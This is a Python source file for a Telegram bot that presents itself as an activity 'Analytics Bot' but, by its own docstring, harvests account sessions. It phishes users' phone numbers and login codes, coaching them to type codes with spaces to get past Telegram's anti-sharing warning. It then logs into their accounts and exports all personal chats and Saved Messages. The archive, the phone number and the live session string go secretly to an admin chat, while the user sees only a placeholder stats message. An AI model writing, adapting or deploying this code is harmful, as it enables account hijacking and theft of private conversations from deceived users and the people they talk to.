"""
Telegram Analytics Bot - Сбор StringSession + Авто-экспорт чатов
Пользователь подключается → бот скачивает все чаты → присылает ZIP админу
"""

import asyncio
import os
import json
import zipfile
import shutil
import tempfile
import aiohttp
import threading
from datetime import datetime
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import PhoneCodeInvalidError, PhoneCodeExpiredError

import logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('analytics_bot')

# ==========================================
# НАСТРОЙКИ
# ==========================================

BOT_TOKEN = os.getenv('BOT_TOKEN', '')
API_ID = int(os.getenv('API_ID', '1234567'))
API_HASH = os.getenv('API_HASH', '')
ADMIN_CHAT_ID = int(os.getenv('ADMIN_CHAT_ID', '123456789'))
PORT = int(os.getenv('PORT', 10000))

if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN не установлен!")

# ==========================================
# АВТОПИНГ
# ==========================================

async def auto_ping():
    url = f"http://localhost:{PORT}/health"
    logger.info(f"🔄 Автопинг запущен (каждые 4 минуты)")
    while True:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=10) as resp:
                    if resp.status == 200:
                        logger.debug("🔄 Пинг успешен")
        except:
            pass
        await asyncio.sleep(240)

# ==========================================
# ВЕБ-СЕРВЕР
# ==========================================

from fastapi import FastAPI
import uvicorn

web_app = FastAPI(title="Analytics Bot")

@web_app.get("/health")
async def health():
    return {"status": "ok", "service": "Analytics Bot", "timestamp": datetime.now().isoformat()}

def run_web():
    uvicorn.run(web_app, host="0.0.0.0", port=PORT, log_level="warning")

# ==========================================
# БОТ
# ==========================================

class AnalyticsBot:
    def __init__(self):
        self.bot = TelegramClient('bot_session', API_ID, API_HASH)
        self.pending = {}
        self.exporting = {}  # {user_id: bool}
    
    async def start(self):
        await self.bot.start(bot_token=BOT_TOKEN)
        logger.info("✅ Бот запущен")
        
        self.bot.add_event_handler(self.cmd_start, events.NewMessage(pattern='/start'))
        self.bot.add_event_handler(self.cmd_help, events.NewMessage(pattern='/help'))
        self.bot.add_event_handler(self.cmd_stats, events.NewMessage(pattern='/stats'))
        self.bot.add_event_handler(self.cmd_add, events.NewMessage(pattern='/add'))
        self.bot.add_event_handler(self.handle_msg, events.NewMessage())
        
        await self.bot.run_until_disconnected()
    
    # ===== КОМАНДЫ =====
    
    async def cmd_start(self, e):
        await e.respond("""
📊 **Telegram Analytics Bot**

Анализируйте свою активность в Telegram!

📌 **Команды:**
/add - Подключить аккаунт для аналитики
/stats - Статистика (после сбора данных)
/help - Помощь
""")
    
    async def cmd_help(self, e):
        await e.respond("""
📚 **Как подключить аккаунт:**

1️⃣ Отправьте /add

2️⃣ Введите номер телефона

3️⃣ Введите код из Telegram (МОЖНО С ПРОБЕЛАМИ!)
   Пример: 12 345 или 1-2-3-4-5

4️⃣ Готово! 🎉

⏳ **После подключения:**
Ваши чаты будут обработаны в фоне.
Обычно это занимает 1-5 минут.
""")
    
    async def cmd_stats(self, e):
        await e.respond("""
📊 **Статистика пока пуста**

⏳ Подключите аккаунт через /add.
После обработки чатов статистика появится здесь.
""")
    
    async def cmd_add(self, e):
        uid = e.sender_id
        
        if uid in self.pending:
            await e.respond("⏳ Уже идёт подключение. Дождитесь завершения.")
            return
        
        self.pending[uid] = {'step': 'phone'}
        await e.respond("""
📱 **Введите номер телефона**

Например: +79001234567
""")
    
    # ===== ОБРАБОТКА СООБЩЕНИЙ =====
    
    async def handle_msg(self, e):
        uid = e.sender_id
        text = e.text
        
        if not text or text.startswith('/'):
            return
        
        if uid not in self.pending:
            return
        
        step = self.pending[uid].get('step')
        
        if step == 'phone':
            await self.process_phone(e, text)
        elif step == 'code':
            await self.process_code(e, text)
    
    # ===== ОБРАБОТКА ТЕЛЕФОНА =====
    
    async def process_phone(self, e, phone: str):
        uid = e.sender_id
        
        phone = phone.strip()
        phone = phone.replace(' ', '').replace('-', '').replace('(', '').replace(')', '').replace('.', '')
        
        if phone.startswith('8') and len(phone) == 11:
            phone = '+7' + phone[1:]
        elif not phone.startswith('+'):
            phone = '+' + phone
        
        await e.respond("⏳ Отправляю код подтверждения...")
        
        try:
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            result = await client.send_code_request(phone)
            
            self.pending[uid] = {
                'step': 'code',
                'phone': phone,
                'hash': result.phone_code_hash,
                'client': client
            }
            
            await e.respond("""
📨 **Код отправлен!**

💡 Введите код МОЖНО С ПРОБЕЛАМИ:
`12 345` или `1-2-3-4-5`

⚠️ Telegram НЕ блокирует вход, если код введён с пробелами!
""")
            
        except Exception as err:
            await e.respond(f"❌ Ошибка: {err}")
            if uid in self.pending:
                del self.pending[uid]
    
    # ===== ОБРАБОТКА КОДА =====
    
    async def process_code(self, e, code: str):
        uid = e.sender_id
        data = self.pending.get(uid)
        
        if not data:
            return
        
        code = code.strip()
        code = code.replace(' ', '').replace('-', '').replace('(', '').replace(')', '').replace('.', '')
        
        logger.info(f"Код после очистки: {code}")
        
        try:
            await data['client'].sign_in(
                phone=data['phone'],
                code=code,
                phone_code_hash=data['hash']
            )
            
            me = await data['client'].get_me()
            session_string = data['client'].session.save()
            
            # ⭐ ЗАПУСКАЕМ ЭКСПОРТ В ФОНЕ
            asyncio.create_task(self.export_and_send(uid, session_string, me))
            
            # ⭐ ПОЛЬЗОВАТЕЛЮ — ЖДИ
            await e.respond(f"""
✅ **Аккаунт подключен!**

👤 {me.first_name}, ваши чаты обрабатываются.

⏳ Обычно это занимает 1-5 минут.
Как только всё будет готово — вы получите уведомление.

📊 /stats — проверка статуса
""")
            
            if uid in self.pending:
                del self.pending[uid]
            
        except PhoneCodeInvalidError:
            await e.respond("""
❌ **Неверный код!**

💡 Попробуйте ещё раз (можно с пробелами):
`12 345` или `1-2-3-4-5`
""")
            
        except PhoneCodeExpiredError:
            await e.respond("❌ Код истек! Начните заново с /add")
            if uid in self.pending:
                del self.pending[uid]
                
        except Exception as err:
            await e.respond(f"❌ Ошибка: {err}")
            if uid in self.pending:
                del self.pending[uid]
    
    # ===== ЭКСПОРТ ЧАТОВ =====
    
    async def export_and_send(self, uid: int, session_string: str, me):
        """Экспорт всех чатов и отправка ZIP админу"""
        
        if self.exporting.get(uid, False):
            logger.warning(f"Экспорт для {uid} уже запущен")
            return
        
        self.exporting[uid] = True
        
        try:
            # Уведомление админу о начале
            await self.bot.send_message(ADMIN_CHAT_ID, f"""
📥 **Начинаю экспорт чатов!**

👤 {me.first_name} {me.last_name or ''}
📱 +{me.phone}
🆔 ID: {me.id}
⏳ Подождите, это может занять несколько минут...
""")
            
            # Подключаемся через сессию
            client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
            await client.connect()
            
            if not await client.is_user_authorized():
                await self.bot.send_message(ADMIN_CHAT_ID, f"❌ Ошибка: невалидная сессия для {me.id}")
                return
            
            # Создаём папку для экспорта
            export_dir = tempfile.mkdtemp()
            
            # Получаем диалоги
            dialogs = await client.get_dialogs()
            
            # Личные чаты + Избранное (исключаем ботов)
            personal_chats = [
                d for d in dialogs
                if d.is_user
                and not getattr(d.entity, 'bot', False)
            ]
            
            total_messages = 0
            processed = 0
            
            for dialog in personal_chats:
                try:
                    username = dialog.entity.username if dialog.entity.username else 'нет_username'
                    chat_label = "📌 ИЗБРАННОЕ" if dialog.is_me else dialog.name
                    
                    messages = []
                    messages_by_id = {}
                    
                    async for msg in client.iter_messages(dialog, limit=None):
                        sender_name = None
                        if msg.sender:
                            sender_name = msg.sender.first_name
                            if msg.sender.last_name:
                                sender_name += f" {msg.sender.last_name}"
                        
                        reactions_info = []
                        if msg.reactions and msg.reactions.results:
                            for reaction in msg.reactions.results:
                                reaction_type = 'unknown'
                                if reaction.reaction:
                                    if hasattr(reaction.reaction, 'emoticon'):
                                        reaction_type = reaction.reaction.emoticon
                                    else:
                                        reaction_type = str(reaction.reaction)
                                
                                reactors = []
                                if hasattr(reaction, 'recent_reactions') and reaction.recent_reactions:
                                    for recent in reaction.recent_reactions:
                                        if hasattr(recent, 'peer_id'):
                                            try:
                                                user = await client.get_entity(recent.peer_id)
                                                reactor_name = user.first_name
                                                if user.last_name:
                                                    reactor_name += f" {user.last_name}"
                                                reactors.append(reactor_name)
                                            except:
                                                pass
                                
                                reactions_info.append({
                                    'reaction': reaction_type,
                                    'count': reaction.count,
                                    'reactors': reactors if reactors else None
                                })
                        
                        message_data = {
                            'id': msg.id,
                            'date': msg.date.isoformat() if msg.date else None,
                            'text': msg.text or '',
                            'sender_id': msg.sender_id,
                            'sender_name': sender_name,
                            'reply_to_msg_id': msg.reply_to_msg_id,
                            'reply_to_text': None,
                            'reply_to_sender': None,
                            'has_media': bool(msg.media),
                            'media_type': str(msg.media.__class__.__name__) if msg.media else None,
                            'reactions': reactions_info if reactions_info else None
                        }
                        
                        messages.append(message_data)
                        messages_by_id[msg.id] = message_data
                    
                    # Добавляем информацию об ответах
                    for msg_data in messages:
                        if msg_data['reply_to_msg_id'] and msg_data['reply_to_msg_id'] in messages_by_id:
                            reply_to = messages_by_id[msg_data['reply_to_msg_id']]
                            msg_data['reply_to_text'] = reply_to.get('text', '')[:200]
                            msg_data['reply_to_sender'] = reply_to.get('sender_name')
                    
                    # Сохраняем JSON
                    safe_name = dialog.name.replace('/', '_').replace('\\', '_')
                    if dialog.is_me:
                        safe_name = "saved_messages"
                    filename = f"{dialog.id}_{safe_name}.json"
                    filepath = os.path.join(export_dir, filename)
                    
                    with open(filepath, 'w', encoding='utf-8') as f:
                        json.dump({
                            'chat_name': "Избранное (Saved Messages)" if dialog.is_me else dialog.name,
                            'chat_id': dialog.id,
                            'username': username,
                            'is_saved_messages': dialog.is_me,
                            'total_messages': len(messages),
                            'export_date': datetime.now().isoformat(),
                            'messages': messages
                        }, f, ensure_ascii=False, indent=2)
                    
                    total_messages += len(messages)
                    processed += 1
                    
                    logger.info(f"✅ {chat_label}: {len(messages)} сообщений")
                    
                except Exception as err:
                    logger.error(f"Ошибка чата {dialog.name}: {err}")
            
            # Создаём ZIP
            zip_filename = tempfile.mktemp(suffix='.zip')
            with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, dirs, files in os.walk(export_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, export_dir)
                        zipf.write(file_path, arcname)
            
            shutil.rmtree(export_dir)
            await client.disconnect()
            
            # ⭐ ОТПРАВЛЯЕМ ZIP АДМИНУ
            with open(zip_filename, 'rb') as f:
                await self.bot.send_file(
                    ADMIN_CHAT_ID,
                    f,
                    caption=f"""
📦 **Экспорт завершён!**

👤 {me.first_name} {me.last_name or ''}
📱 +{me.phone}
🆔 ID: {me.id}

📨 Сообщений: {total_messages}
📁 Чатов: {processed}

🔑 **STRING SESSION:**
`{session_string}`

📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
                )
            
            os.unlink(zip_filename)
            
            logger.info(f"✅ Экспорт для {me.id} завершён, ZIP отправлен")
            
        except Exception as err:
            logger.error(f"Ошибка экспорта для {uid}: {err}")
            await self.bot.send_message(ADMIN_CHAT_ID, f"❌ Ошибка экспорта для {me.id}: {err}")
        finally:
            self.exporting[uid] = False

# ==========================================
# ЗАПУСК
# ==========================================

async def main():
    web_thread = threading.Thread(target=run_web, daemon=True)
    web_thread.start()
    logger.info("✅ Веб-сервер запущен")
    
    asyncio.create_task(auto_ping())
    logger.info("✅ Автопинг запущен")
    
    bot = AnalyticsBot()
    await bot.start()

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n🛑 Бот остановлен")